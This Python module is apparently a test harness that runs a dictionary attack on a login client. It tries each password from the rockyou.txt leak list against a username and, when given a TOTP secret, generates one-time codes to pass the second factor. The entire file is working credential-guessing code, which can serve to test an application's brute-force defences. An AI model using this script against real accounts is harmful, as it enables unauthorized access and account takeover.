import os
import pyotp
from urllib.parse import urlparse, parse_qs
from .client import login, login_totp


def start_test(username, max_tries, otp_uri=None):
    # Get the directory where this script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))
    rockyou_file_path = os.path.join(script_dir, 'rockyou.txt')
    
    attempt_count = 0
    
    # Read rockyou.txt line by line
    with open(rockyou_file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            
            # Skip empty lines
            if not password:
                continue
            
            attempt_count += 1
            
            # Check if we've reached the maximum number of tries
            if attempt_count > max_tries:
                print(f"\n✗ Maximum number of tries ({max_tries}) reached")
                return None
            
            # Try to login with this password
            response, status_code, redirect_url = login(username, password)
            
            # Check if login was successful
            # Status 200 = success (no TOTP)
            if status_code == 200:
                print(f"Password found after {attempt_count} attempts!")
                print(f"Password: {password}")
                return password
            elif status_code == 302:
                # Check if redirect is to TOTP endpoint
                if redirect_url and '/login_totp' in redirect_url:
                    # Password is correct, but TOTP is required
                    if otp_uri is None:
                        print(f"Password found after {attempt_count} attempts, but TOTP URI not provided!")
                        print(f"Password: {password}")
                        return password  # Still return password as found
                    
                    print(f"Got redirect to TOTP endpoint with password: {password}")
                    # Extract secret from otp_uri
                    parsed = urlparse(otp_uri)
                    query_params = parse_qs(parsed.query)
                    otp_secret = query_params.get('secret', [None])[0]
                    
                    if otp_secret is None:
                        print(f"Password found after {attempt_count} attempts, but could not extract secret from TOTP URI!")
                        print(f"Password: {password}")
                        return None
                    
                    # Generate TOTP code from secret
                    totp = pyotp.TOTP(otp_secret)
                    code = totp.now()
                    
                    # Try to verify TOTP
                    totp_response, totp_status = login_totp(username, code)
                    
                    if totp_status == 200:
                        print(f"Password found after {attempt_count} attempts!")
                        print(f"Password: {password}")
                        print(f"TOTP verification successful!")
                        return password
                    else:
                        # Password correct but TOTP failed - still consider password found
                        print(f"Password found after {attempt_count} attempts, but TOTP verification failed!")
                        print(f"Password: {password}")
                        return password
                else:
                    # Redirect to something other than TOTP - treat as failed password guess
                    continue
            
            # Print progress every 1000 attempts
            if attempt_count % 1000 == 0:
                print(f"Attempted {attempt_count}/{max_tries} passwords... (current: {password[:20]}...)")
            
    print(f"Password not found after {attempt_count} attempts")
    return None

if __name__ == '__main__':
    start_test("monika", 10000)